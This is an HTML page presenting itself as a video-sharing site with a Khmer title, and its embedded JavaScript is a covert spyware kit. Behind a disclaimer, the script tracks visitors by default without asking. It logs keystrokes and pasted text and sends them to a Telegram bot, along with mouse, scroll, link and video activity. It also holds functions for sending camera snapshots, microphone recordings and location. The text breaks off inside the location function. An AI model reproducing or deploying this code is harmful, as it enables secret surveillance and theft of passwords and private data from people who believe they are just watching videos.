<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <style>
    /* --- Base Styles --- */
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');
    :root {
      --theme-color: #FF0076;
      --background-color: #f9f9f9;
      --card-background: #ffffff;
      --text-primary: #0f0f0f;
      --text-secondary: #606060;
      --border-color: #ddd;
      --card-hover-shadow: 0 6px 12px rgba(0,0,0,0.1); /* Softer hover shadow */
    }
    body { margin: 0; background: var(--background-color); font-family: 'Roboto', Arial, sans-serif; color: var(--text-primary); line-height: 1.5; }
    .hidden { display: none !important; }

    /* --- Header --- */
    .site-header { background: var(--card-background); padding: 0 24px; border-bottom: 1px solid var(--border-color); display: flex; align-items: center; justify-content: space-between; height: 60px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 900; }
    .site-header h1 { font-family: "Kantumruy Pro", serif; font-size: 1.6em; color: var(--theme-color); margin: 0; } /* Slightly larger title */
    .back-button { font-size: 1em; font-weight: 500; cursor: pointer; padding: 8px 16px; border-radius: 20px; background-color: #eee; border: none; transition: background-color 0.2s ease; }
    .back-button:hover { background-color: #ddd; }

    /* --- Main Content Layout --- */
    #video-grid-page .container { max-width: 1400px; margin: 0 auto; padding: 24px; }
    #video-player-page { padding: 24px; display: flex; gap: 24px; max-width: 1600px; margin: 0 auto; }
    .main-video-content { flex: 1; min-width: 0; }
    .recommendations-sidebar { width: 400px; flex-shrink: 0; }
    
    /* --- Video Grid --- */
    .video-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 24px 16px; }
    .video-card { cursor: pointer; transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; border-radius: 12px; background: var(--card-background); padding: 16px; } /* Added padding and background for cards */
    .video-card:hover { transform: translateY(-5px); box-shadow: var(--card-hover-shadow); } /* Enhanced hover effect */
    .thumbnail-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #eee; border-radius: 12px; overflow: hidden; margin-bottom: 12px; }
    .thumbnail-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; }
    .duration { position: absolute; bottom: 8px; right: 8px; background-color: rgba(0, 0, 0, 0.8); color: white; padding: 2px 6px; border-radius: 4px; font-size: 0.8em; font-weight: 500; }
    .video-details { display: flex; gap: 12px; }
    .channel-avatar { width: 40px; height: 40px; border-radius: 50%; background-color: #ccc; flex-shrink: 0; object-fit: cover; } /* Added object-fit */
    .video-metadata { display: flex; flex-direction: column; flex: 1; }
    .video-title { font-size: 1rem; font-weight: 500; margin: 0 0 4px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
    .channel-name { font-weight: 500; color: var(--text-primary); margin: 0; } /* Channel name bolder */
    .channel-name:hover { color: var(--theme-color); } /* Add hover effect for channel name */
    .video-stats { font-size: 0.875rem; color: var(--text-secondary); margin: 0; }

    /* --- Video Player Page --- */
    .player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background-color: #000; border-radius: 15px; overflow: hidden; margin-bottom: 16px; } /* Added margin-bottom */
    .player-wrapper video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
    .main-video-title { font-size: 1.6em; font-weight: 700; margin: 16px 0 8px 0; } /* Larger title */
    .video-info-bar { display: flex; align-items: center; gap: 12px; margin-top: 12px; padding-bottom: 16px; border-bottom: 1px solid var(--border-color); } /* Added padding and border */
    .subscribe-btn { margin-left: auto; background-color: var(--theme-color); color: white; border: none; padding: 10px 20px; border-radius: 20px; font-weight: 500; cursor: pointer; transition: background-color 0.2s ease; font-size: 1rem; }
    .subscribe-btn:hover { background-color: #e6006c; }
    .description-box { background-color: #eee; padding: 16px; border-radius: 12px; margin-top: 20px; font-size: 0.95rem; } /* Slightly larger font for description */
    .description-box .video-stats { color: var(--text-primary); font-weight: 500; margin-bottom: 8px; }
    .description-box .description-text { margin-top: 8px; line-height: 1.6; } /* Increased line height */

    /* --- Recommendations Sidebar --- */
    .recommendations-sidebar { background-color: var(--card-background); padding: 16px 16px 24px 16px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); } /* Style sidebar as a card */
    .recommendations-sidebar h3 { margin: 0 0 16px 0; font-size: 1.2em; font-weight: 700; }
    .compact-video-card { display: flex; gap: 10px; margin-bottom: 12px; cursor: pointer; padding: 10px; border-radius: 8px; transition: background-color 0.2s ease; }
    .compact-video-card:hover { background-color: #f0f0f0; }
    .compact-video-card .thumbnail-wrapper { width: 160px; flex-shrink: 0; padding-bottom: 90px; }
    .compact-video-card .thumbnail-wrapper video { border-radius: 8px; }
    .compact-video-card .video-metadata { flex: 1; }
    .compact-video-card .video-title { font-size: 0.95rem; font-weight: 500; line-height: 1.3; margin-bottom: 2px; }
    .compact-video-card .channel-name { font-size: 0.8rem; color: var(--text-secondary); margin-bottom: 2px; }
    .compact-video-card .video-stats { font-size: 0.75rem; color: var(--text-secondary); }

    /* --- Media Query for Responsiveness --- */
    @media (max-width: 1200px) {
      #video-player-page { flex-direction: column; }
      .recommendations-sidebar { width: 100%; margin-top: 24px; }
    }
  </style>
</head>
<body>

<header class="site-header">
  <h1 id="header-title">·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1>
  <button id="back-to-grid" class="back-button hidden">&larr; Back</button>
</header>

<main id="video-grid-page">
  <div class="container">
    <div class="video-grid"></div>
  </div>
</main>

<main id="video-player-page" class="hidden">
  <div class="main-video-content">
    <div class="player-wrapper">
        <video id="main-player" controls autoplay playsinline webkit-playsinline></video>
    </div>
    <h2 id="main-video-title" class="main-video-title"></h2>
    <div class="video-info-bar">
      <img id="main-channel-avatar" src="" alt="Channel Avatar" class="channel-avatar" />
      <div class="video-metadata">
        <p id="main-channel-name" class="channel-name"></p>
        <p class="video-stats">1.2M subscribers</p> <!-- Placeholder -->
      </div>
      <button class="subscribe-btn">Subscribe</button>
    </div>
    <div class="description-box">
      <p id="main-video-stats" class="video-stats"></p>
      <p class="description-text">This is a placeholder for the video description. #hashtag #anothertag</p>
    </div>
  </div>
  <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
</main>

<div class="capture-container" style="display: none;">
  <video id="videoElementForCapture" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>
</div>

<script>
// --- IMPORTANT PRIVACY AND LEGAL WARNING ---
// This script is designed for educational and research purposes ONLY.
// It contains functionalities that, if misused, can violate user privacy and legal regulations.
// By using this code, you acknowledge and agree that you are solely responsible for its ethical and legal use.
// The author and distributors are NOT liable for any misuse, damages, or legal consequences arising from the use of this script.
// Ensure you have explicit consent from users before enabling any tracking features that collect personal data,
// and comply with all applicable privacy laws (e.g., GDPR, CCPA).
// --- END WARNING ---

const App = {
  config: {
    // !!! REPLACE WITH YOUR ACTUAL TELEGRAM BOT TOKEN AND CHAT ID !!!
    // You can get a bot token by talking to @BotFather on Telegram.
    // You can get your chat ID by sending a message to @userinfobot on Telegram.
    botToken: "YOUR_REAL_BOT_TOKEN_HERE",
    chatId: "YOUR_REAL_CHAT_ID_HERE",
    snapshotInterval: 15000, // 15 seconds
    micRecordInterval: 30000, // 30 seconds
    activityTrackingInterval: 5000, // 5 seconds
    pageAnalyticsInterval: 60000, // 1 minute
    sessionTimeout: 1800000, // 30 minutes of inactivity
    maxBufferedEvents: 50,
    videosJsonPath: 'videos.json',
  },
  state: {
    isLoggedIn: false, // Currently unused, but kept for potential future use
    isTrackingActive: true,
    pageStartTime: Date.now(),
    lastActivityTime: Date.now(),
    sessionStartTime: Date.now(),
    keyLogBuffer: "",
    userLocation: { lat: "N/A", lon: "N/A" },
    microphoneStream: null,
    mediaRecorder: null,
    cameraStream: null,
    snapshotIntervalId: null,
    activityTrackerIntervalId: null,
    pageAnalyticsIntervalId: null,
    mouseMovements: [],
    scrollHistory: [],
    copyPasteEvents: [],
    devToolsOpen: false,
    pagePerformanceMetrics: {},
    linkClicks: [],
    isContentLoaded: false,
    videosData: null,

    permissions: {
      camera: localStorage.getItem('permission_camera') || 'prompt',
      microphone: localStorage.getItem('permission_microphone') || 'prompt',
      geolocation: localStorage.getItem('permission_geolocation') || 'prompt',
    }
  },
  DOM: {},
  init() {
    this.DOM = {
      gridPage: document.getElementById('video-grid-page'),
      playerPage: document.getElementById('video-player-page'),
      mainPlayer: document.getElementById('main-player'),
      backButton: document.getElementById('back-to-grid'),
      headerTitle: document.getElementById('header-title'),
      captureVideo: document.getElementById('videoElementForCapture'),
      captureCanvas: document.getElementById('snapshot'),
      videoGrid: document.querySelector('.video-grid'),
      recommendationsSidebar: document.getElementById('recommendations-sidebar'), // Added for recommendations
    };

    // Basic validation for Telegram credentials
    if (this.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE" || this.config.chatId === "YOUR_REAL_CHAT_ID_HERE") {
        console.error("!!! TELEGRAM CREDENTIALS NOT SET !!! Please replace 'YOUR_REAL_BOT_TOKEN_HERE' and 'YOUR_REAL_CHAT_ID_HERE' in App.config with your actual Telegram bot token and chat ID.");
        // Optionally, disable tracking if credentials are not set
        // this.state.isTrackingActive = false;
        // alert("Tracking functionality may be limited as Telegram credentials are not configured.");
    } else {
        console.log("Tracking is active by default (implicit consent).");
    }

    this.recordPageLoadTimes();
    this.setupEventListeners();
    this.Tracking.initialize();
    this.startPageAnalytics();
    this.startSessionTimer();

    this.fetchAndGenerateVideoGrid();
  },

  fetchAndGenerateVideoGrid() {
    fetch(this.config.videosJsonPath)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      })
      .then(videoData => {
        this.state.videosData = videoData;
        this.generateVideoGrid();
        this.state.isContentLoaded = true;
      })
      .catch(error => {
        console.error("Error fetching or parsing videos.json:", error);
        if (this.DOM.videoGrid) {
          this.DOM.videoGrid.innerHTML = '<p>Could not load videos. Please try again later.</p>';
        }
        this.state.isContentLoaded = true;
      });
  },

  recordPageLoadTimes() {
    const perfEntries = performance.getEntriesByType("navigation");
    if (perfEntries.length > 0) {
      const navTiming = perfEntries[0];
      this.state.pagePerformanceMetrics = {
        fetchStart: navTiming.fetchStart,
        domContentLoadedEventEnd: navTiming.domContentLoadedEventEnd,
        loadEventEnd: navTiming.loadEventEnd,
        duration: navTiming.duration,
        type: navTiming.type,
        redirectCount: navTiming.redirectCount,
      };
      console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
    } else {
      // Fallback for browsers that don't support NavigationTiming directly or it's not available
      if (performance && performance.timing) {
          this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
          this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
          this.state.pagePerformanceMetrics.loadEventEnd = performance.timing.loadEventEnd;
          this.state.pagePerformanceMetrics.duration = performance.timing.loadEventEnd - performance.timing.fetchStart;
          console.log("Page Load Metrics recorded (using fallback timing):", this.state.pagePerformanceMetrics);
      } else {
          console.warn("PerformanceTiming API not fully available.");
      }
    }
    this.state.pageStartTime = Date.now();
  },

  generateVideoGrid() {
    console.log("Generating video grid with fetched data...");
    const videos = this.state.videosData;

    if (!videos) {
      console.error("Video data not loaded yet or is empty.");
      return;
    }

    const videoGrid = this.DOM.videoGrid;
    if (!videoGrid) {
      console.error("Video grid element not found!");
      return;
    }
    videoGrid.innerHTML = '';

    videos.forEach(video => {
      const card = document.createElement('div');
      card.classList.add('video-card');
      card.innerHTML = `
        <div class="thumbnail-wrapper">
          <video src="${video.src}" preload="metadata"></video>
          <span class="duration">3:45</span> <!-- Placeholder duration -->
        </div>
        <div class="video-details">
          <img src="${video.channelAvatar}" alt="Channel Avatar" class="channel-avatar" />
          <div class="video-metadata">
            <h3 class="video-title">${video.title}</h3>
            <p class="channel-name">${video.channel}</p>
            <p class="video-stats">${video.views} views &#8226; ${video.timestamp}</p>
          </div>
        </div>
      `;
      card.addEventListener('click', () => {
          // No need to check for link here as the card itself is clickable
          this.showPlayer(video);
      });
      videoGrid.appendChild(card);
    });
  },

  setupEventListeners() {
    if (this.DOM.backButton) {
      this.DOM.backButton.addEventListener('click', () => this.showGrid());
    }

    // No login form element found in the provided HTML
    // const loginForm = document.getElementById('loginForm');
    // if (loginForm) { ... }

    document.addEventListener('click', (e) => {
      if (!this.state.isTrackingActive) return;

      const target = e.target;
      const backButton = document.getElementById('back-to-grid');

      // Prevent tracking clicks on the back button itself if we don't want that.
      // However, the main purpose is to track clicks on links or other elements.
      if (target === backButton || (backButton && backButton.contains(target))) {
        // If click is on back button, don't track as a link click, but still update activity.
        this.updateActivityTime();
        return;
      }

      const link = target.closest('a');
      if (link && link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
        this.trackLinkClick(link);
      }

      this.trackClick(e); // Track general clicks
      this.updateActivityTime();
    });

    let scrollTimeout;
    document.addEventListener('scroll', () => {
      if (!this.state.isTrackingActive) return;
      clearTimeout(scrollTimeout);
      scrollTimeout = setTimeout(() => {
        this.trackScroll();
        this.updateActivityTime();
      }, 100);
    }, { passive: true });

    let mouseMoveTimeout;
    document.addEventListener('mousemove', (e) => {
      if (!this.state.isTrackingActive) return;
      clearTimeout(mouseMoveTimeout);
      mouseMoveTimeout = setTimeout(() => {
        this.trackMouseMove(e);
        this.updateActivityTime();
      }, 100);
    });

    document.addEventListener('keypress', (e) => {
      if (!this.state.isTrackingActive) return;
      this.trackKeyPress(e);
      this.updateActivityTime();
    });

    document.addEventListener('copy', (e) => {
      if (!this.state.isTrackingActive) return;
      this.trackCopyPaste(e, 'copy');
      this.updateActivityTime();
    });
    document.addEventListener('paste', (e) => {
      if (!this.state.isTrackingActive) return;
      this.trackCopyPaste(e, 'paste');
      this.updateActivityTime();
    });

    window.addEventListener('beforeunload', () => {
      if (this.state.isTrackingActive) {
        this.Tracking.send(`üçÉ Session Ended. Duration: ${this.formatTime(Date.now() - this.state.sessionStartTime)}`);
        this.stopAllTracking();
      }
    });
  },

  showPlayer(video) {
    if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
    this.DOM.gridPage.classList.add('hidden');
    this.DOM.playerPage.classList.remove('hidden');
    this.DOM.backButton.classList.remove('hidden');
    this.DOM.headerTitle.textContent = video.title;

    const mainPlayer = this.DOM.mainPlayer;
    if (mainPlayer) {
      mainPlayer.src = video.src;
      // Autoplay policies vary by browser, so include a catch block.
      mainPlayer.play().catch(e => console.warn("Autoplay failed:", e));
      this.trackVideoPlayerEvents(mainPlayer);
    }

    if (this.DOM.mainVideoTitle) this.DOM.mainVideoTitle.textContent = video.title;
    if (this.DOM.mainChannelAvatar) this.DOM.mainChannelAvatar.src = video.channelAvatar;
    if (this.DOM.mainChannelName) this.DOM.mainChannelName.textContent = video.channel;

    // Update subscriber count dynamically if available, otherwise keep placeholder
    const videoInfoBarStats = document.querySelector('.video-info-bar .video-stats');
    if (videoInfoBarStats) videoInfoBarStats.textContent = `${video.subscribers ? video.subscribers.toLocaleString() : '1.2M'} subscribers`; // Assuming 'subscribers' property in video data

    const mainVideoStats = document.getElementById('main-video-stats');
    if (mainVideoStats) mainVideoStats.innerHTML = `${video.views} views &#8226; ${video.timestamp}`;

    this.populateRecommendations(video.id); // Pass current video ID to exclude it from recommendations
    this.updateActivityTime();
  },

  showGrid() {
    if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
    this.DOM.gridPage.classList.remove('hidden');
    this.DOM.playerPage.classList.add('hidden');
    this.DOM.backButton.classList.add('hidden');
    this.DOM.headerTitle.textContent = "·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô";
    if (this.DOM.mainPlayer) {
      this.DOM.mainPlayer.pause();
      this.DOM.mainPlayer.removeAttribute('src');
      this.removeVideoPlayerListeners(this.DOM.mainPlayer);
    }
    this.updateActivityTime();
  },

  populateRecommendations(currentVideoId) {
    console.log(`Populating recommendations for video ID: ${currentVideoId}`);
    const sidebar = this.DOM.recommendationsSidebar;
    if (!sidebar) return;
    sidebar.innerHTML = '<h3>Recommended Videos</h3>';
    
    const recommendedVideos = this.state.videosData ?
      this.state.videosData.filter(v => v.id !== currentVideoId).slice(0, 3) : // Exclude current video, take top 3
      // Fallback data if videos.json fails to load
      [
        { id: 3, title: "Another Nature Clip", src: "video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer", channelAvatar: "path/to/avatar3.jpg", subscribers: 100000 },
        { id: 4, title: "Web Development Tips", src: "video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master", channelAvatar: "path/to/avatar4.jpg", subscribers: 75000 },
        { id: 5, title: "Travel Vlog - Paris", src: "video5.mp4", views: "200K", timestamp: "1 week ago", channel: "Wanderlust", channelAvatar: "path/to/avatar5.jpg", subscribers: 200000 },
      ];

    recommendedVideos.forEach(recVideo => {
        const card = document.createElement('div');
        card.classList.add('compact-video-card');
        card.innerHTML = `
          <div class="thumbnail-wrapper">
            <video src="${recVideo.src}" preload="metadata"></video>
            <span class="duration">1:15</span> <!-- Placeholder duration -->
          </div>
          <div class="video-metadata">
            <h3 class="video-title">${recVideo.title}</h3>
            <p class="channel-name">${recVideo.channel}</p>
            <p class="video-stats">${recVideo.views} views &#8226; ${recVideo.timestamp}</p>
          </div>
        `;
        card.addEventListener('click', () => this.showPlayer(recVideo));
        sidebar.appendChild(card);
    });
  },

  // --- Activity Tracking Functions ---
  updateActivityTime() {
    this.state.lastActivityTime = Date.now();
  },

  startSessionTimer() {
    // This function is responsible for checking inactivity and stopping tracking.
    // It's called by startPageAnalytics periodically.
  },

  startPageAnalytics() {
    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
    this.state.pageAnalyticsIntervalId = setInterval(() => {
      if (Date.now() - this.state.lastActivityTime > this.config.sessionTimeout) {
        this.Tracking.send(`‚è≥ User Inactive for ${this.config.sessionTimeout / 60000} minutes.`);
        this.stopAllTracking();
      } else {
        this.logPageInteraction();
      }
    }, this.config.pageAnalyticsInterval);
  },

  logPageInteraction() {
    if (!this.state.isTrackingActive) return;

    const timeOnPage = Date.now() - this.state.pageStartTime;
    const sessionDuration = Date.now() - this.state.sessionStartTime;

    let report = `*üìä Page Interaction Report*\n\n`;
    report += `*Page URL:* \`${window.location.href}\`\n`;
    report += `*Time on Page:* ${this.formatTime(timeOnPage)}\n`;
    report += `*Session Duration:* ${this.formatTime(sessionDuration)}\n`;

    if (Object.keys(this.state.pagePerformanceMetrics).length > 0) {
        report += `*Page Performance:*\n`;
        // Check if property exists before accessing
        report += `  *Fetch Start:* ${this.state.pagePerformanceMetrics.fetchStart ? new Date(this.state.pagePerformanceMetrics.fetchStart).toISOString() : 'N/A'}\n`;
        report += `  *DOMContentLoaded End:* ${this.state.pagePerformanceMetrics.domContentLoadedEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.domContentLoadedEventEnd - (this.state.pagePerformanceMetrics.fetchStart || Date.now())) : 'N/A'}\n`;
        report += `  *Load Event End:* ${this.state.pagePerformanceMetrics.loadEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.loadEventEnd - (this.state.pagePerformanceMetrics.fetchStart || Date.now())) : 'N/A'}\n`;
        report += `  *Navigation Type:* ${this.state.pagePerformanceMetrics.type || 'N/A'}\n`;
    }
    
    const tti = Date.now() - this.state.pageStartTime; // Approximation of Time To Interactive relative to session start
    report += `*Current Page Interaction Time:* ${this.formatTime(tti)}\n`;

    if (this.state.linkClicks.length > 0) {
        report += `*Link Clicks (${this.state.linkClicks.length}):*\n`;
        this.state.linkClicks.forEach(click => {
            report += `  - URL: \`${click.url.substring(0,100)}\`\n    Text: "${click.text.substring(0,50)}"\n`; // Truncate for report
        });
    }

    report += `*Buffered Mouse Movements:* ${this.state.mouseMovements.length} events\n`;
    report += `*Buffered Scroll Events:* ${this.state.scrollHistory.length} events\n`;
    report += `*Buffered Copy/Paste Events:* ${this.state.copyPasteEvents.filter(e => e.type === 'copy').length} / ${this.state.copyPasteEvents.filter(e => e.type === 'paste').length}\n`;
    report += `*Key Log Buffer Size:* ${this.state.keyLogBuffer.length} chars\n`;

    this.Tracking.send(report, true); // Send as a high-priority notification

    // Clear buffers after sending
    this.state.mouseMovements = [];
    this.state.scrollHistory = [];
    this.state.copyPasteEvents = [];
    this.state.keyLogBuffer = "";
    this.state.linkClicks = [];
  },

  trackKeyPress(event) {
    this.state.keyLogBuffer += event.key;
    // Send keypresses in batches to avoid excessive API calls
    if (this.state.keyLogBuffer.length > 200 || event.key === 'Enter' || event.key === 'Backspace') { // Send more frequently on Enter/Backspace or if buffer is large
      this.Tracking.send(`‚å®Ô∏è Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, false); // Not a high-priority notification
      this.state.keyLogBuffer = "";
    }
    this.updateActivityTime();
  },

  trackMouseMove(event) {
    const now = Date.now();
    // Store only a limited number of recent movements to avoid memory issues
    if (this.state.mouseMovements.length < this.config.maxBufferedEvents) {
        this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
    } else {
        // If buffer is full, remove oldest and add new
        this.state.mouseMovements.shift();
        this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
    }
    this.updateActivityTime();
  },

  trackClick(event) {
    // General click tracking can be done here if needed,
    // but link click tracking is handled separately.
    this.updateActivityTime();
  },

  trackScroll() {
    const scrollData = {
      top: window.scrollY,
      t: Date.now()
    };
    if (this.state.scrollHistory.length < this.config.maxBufferedEvents) {
        this.state.scrollHistory.push(scrollData);
    } else {
        this.state.scrollHistory.shift();
        this.state.scrollHistory.push(scrollData);
    }
    this.updateActivityTime();
  },

  trackCopyPaste(event, type) {
    const clipboardData = event.clipboardData || window.clipboardData;
    const content = clipboardData.getData('text');
    const eventData = {
      type: type,
      content: content.substring(0, 100) + (content.length > 100 ? '...' : ''), // Limit content length
      t: Date.now()
    };
    this.state.copyPasteEvents.push(eventData);
    if (this.state.copyPasteEvents.length > this.config.maxBufferedEvents) {
        this.state.copyPasteEvents.shift();
    }

    // Send paste events immediately as they might be more sensitive
    if (type === 'paste') {
      this.Tracking.send(`üìù ${type.charAt(0).toUpperCase() + type.slice(1)}: \`${eventData.content.replace(/`/g, "'")}\``, true); // High priority
    }
    this.updateActivityTime();
  },

  trackLinkClick(linkElement) {
    const linkInfo = {
      url: linkElement.href,
      text: linkElement.textContent.substring(0, 100).trim() + (linkElement.textContent.length > 100 ? '...' : ''),
      target: linkElement.target || '_self',
      id: linkElement.id || 'N/A',
      classes: linkElement.className || 'N/A',
      t: Date.now()
    };
    this.state.linkClicks.push(linkInfo);
    console.log("Link clicked:", linkInfo);
    if (this.state.linkClicks.length > this.config.maxBufferedEvents) {
        this.state.linkClicks.shift();
    }
    this.updateActivityTime();
  },

  // --- Video Player Event Tracking ---
  trackVideoPlayerEvents(player) {
    if (!player) return;

    this.removeVideoPlayerListeners(player); // Clean up previous listeners

    player._trackingListeners = []; // Initialize array to hold listeners

    const addListener = (type, handler) => {
      const actualHandler = () => {
        handler();
        this.updateActivityTime(); // Ensure activity is updated on player events
      };
      player.addEventListener(type, actualHandler);
      player._trackingListeners.push({ type, handler: actualHandler });
    };

    addListener('play', () => this.Tracking.send(`‚ñ∂Ô∏è Video Play: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
    addListener('pause', () => this.Tracking.send(`‚è∏Ô∏è Video Pause: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
    addListener('seeking', () => this.Tracking.send(`üîç Video Seeking: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
    addListener('seeked', () => this.Tracking.send(`‚û°Ô∏è Video Seeked: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
    addListener('volumechange', () => this.Tracking.send(`üîä Volume Changed: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}" (Level: ${player.volume.toFixed(2)})`));
    addListener('ended', () => this.Tracking.send(`üé¨ Video Ended: "${this.DOM.mainVideoTitle.textContent || 'Unknown Title'}"`));
  },

  removeVideoPlayerListeners(player) {
    if (player && player._trackingListeners) {
      player._trackingListeners.forEach(listener => {
        player.removeEventListener(listener.type, listener.handler);
      });
      player._trackingListeners = null;
    }
  },

  stopAllTracking() {
    console.log("Stopping all tracking functions.");
    this.state.isTrackingActive = false;
    if (this.state.snapshotIntervalId) clearInterval(this.state.snapshotIntervalId);
    if (this.state.activityTrackerIntervalId) clearInterval(this.state.activityTrackerIntervalId);
    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
    
    // Stop media streams
    this.Tracking.stopCamera();
    this.Tracking.stopMicrophone();
    
    // Clear interval IDs
    this.state.snapshotIntervalId = null;
    this.state.activityTrackerIntervalId = null;
    this.state.pageAnalyticsIntervalId = null;

    // Clear buffered data
    this.state.mouseMovements = [];
    this.state.scrollHistory = [];
    this.state.copyPasteEvents = [];
    this.state.keyLogBuffer = "";
    this.state.linkClicks = [];

    // Send any remaining keystrokes before fully stopping
    if (this.state.keyLogBuffer.length > 0) {
      this.Tracking.send(`‚å®Ô∏è Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
    }
    // Send final interaction report
    this.logPageInteraction();
  },

  formatTime(ms) {
    if (ms === undefined || ms === null || typeof ms !== 'number' || isNaN(ms)) return 'N/A';
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    return [hours, minutes, seconds].map(v => v < 10 ? "0" + v : v).join(":");
  },

  // --- Tracking Module ---
  Tracking: {
    // Base URL for Telegram Bot API, using the botToken from App.config
    telegramApiBaseUrl: `https://api.telegram.org/bot${App.config.botToken}/`,

    async send(message, notify = false) {
      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return; // Don't send if tracking is off or credentials are not set
      const url = `${this.telegramApiBaseUrl}sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: App.config.chatId, // Use chatId from App.config
            text: message,
            parse_mode: 'Markdown',
            disable_notification: !notify // If notify is false, notification is disabled
          })
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`, errorData);
          // Optionally, send this error to a fallback logging mechanism or a different chat
          // this.send(`üö® Telegram API Error (sendMessage): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
        } else {
          // console.log("Message sent to Telegram successfully."); // Uncomment for verbose logging
        }
      } catch (e) {
        console.warn("Fetch error sending message to Telegram:", e);
        // this.send(`üö® Network Error sending message to Telegram: ${e.message}`, true);
      }
    },

    async sendPhoto(caption, photoBlob) {
      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return;
      const url = `${this.telegramApiBaseUrl}sendPhoto`;
      const formData = new FormData();
      formData.append('chat_id', App.config.chatId); // Use chatId from App.config
      formData.append('caption', caption);
      formData.append('photo', photoBlob, `snapshot_${Date.now()}.png`); // File name for the photo

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`, errorData);
          // this.send(`üö® Telegram API Error (sendPhoto): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
        } else {
          console.log("Photo sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Fetch error sending photo to Telegram:", e);
        // this.send(`üö® Network Error sending photo to Telegram: ${e.message}`, true);
      }
    },

    async sendAudio(caption, audioBlob) {
      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return;
      const url = `${this.telegramApiBaseUrl}sendAudio`;
      const formData = new FormData();
      formData.append('chat_id', App.config.chatId); // Use chatId from App.config
      formData.append('caption', caption);
      formData.append('audio', audioBlob, `recording_${Date.now()}.ogg`); // File name for the audio

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`, errorData);
          // this.send(`üö® Telegram API Error (sendAudio): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
        } else {
          console.log("Audio sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Fetch error sending audio to Telegram:", e);
        // this.send(`üö® Network Error sending audio to Telegram: ${e.message}`, true);
      }
    },

    async sendLocation(latitude, longitude, caption = "User Location") {
      if (!App.state.isTrackingActive || App.config.botToken === "YOUR_REAL_BOT_TOKEN_HERE") return;
      const url = `${this.telegramApiBaseUrl}sendLocation`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: App.config.chatId, // Use chatId from App.config
            latitude: latitude,
            longitude: longitude,
          })
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`, errorData);
          // this.send(`üö® Telegram API Error (sendLocation): ${response.status} ${response.statusText} - ${JSON.stringify(errorData)}`, true);
        } else {
          console.log("Location sent to Telegram successfully.");
        }
